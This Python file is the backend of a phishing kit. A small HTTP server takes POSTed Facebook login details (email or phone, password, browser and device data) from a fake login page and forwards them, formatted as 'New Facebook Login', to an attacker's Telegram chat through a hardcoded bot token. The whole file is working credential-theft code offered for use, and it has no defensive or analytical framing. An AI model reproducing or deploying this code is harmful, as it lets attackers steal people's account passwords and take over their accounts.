import requests
import json
import http.server
import socketserver
import urllib.parse
from urllib.parse import parse_qs

# Hardcoded values for Telegram
TELEGRAM_BOT_TOKEN = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks"
TELEGRAM_CHAT_ID = "6360165707"

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/send_login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            login_data = json.loads(post_data)
            
            # Format message for Telegram
            email = login_data.get('email', 'Unknown')
            password = login_data.get('password', 'Unknown')
            device_info = login_data.get('deviceInfo', {})
            user_agent = device_info.get('userAgent', 'Unknown')
            platform = device_info.get('platform', 'Unknown')
            language = device_info.get('language', 'Unknown')
            time_zone = device_info.get('timeZone', 'Unknown')
            
            message = f"""
📱 *New Facebook Login*

👤 *Login Details:*
Email/Phone: `{email}`
Password: `{password}`

📊 *Device Info:*
Platform: {platform}
Language: {language}
TimeZone: {time_zone}

🔍 *User Agent:*
`{user_agent}`
"""
            
            # Send to Telegram
            success = send_to_telegram(message)
            
            # Respond to the client
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {'success': success}
            self.wfile.write(json.dumps(response).encode())
            return
        else:
            # For all other requests, use the default handler
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

def send_to_telegram(message):
    try:
        telegram_api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(telegram_api_url, data=payload)
        print(f"Telegram API response: {response.status_code} - {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

# This is unused in this implementation since we're using the HTTP server from the workflow
if __name__ == "__main__":
    PORT = 5000
    Handler = CustomHTTPRequestHandler
    
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving at port {PORT}")
        httpd.serve_forever()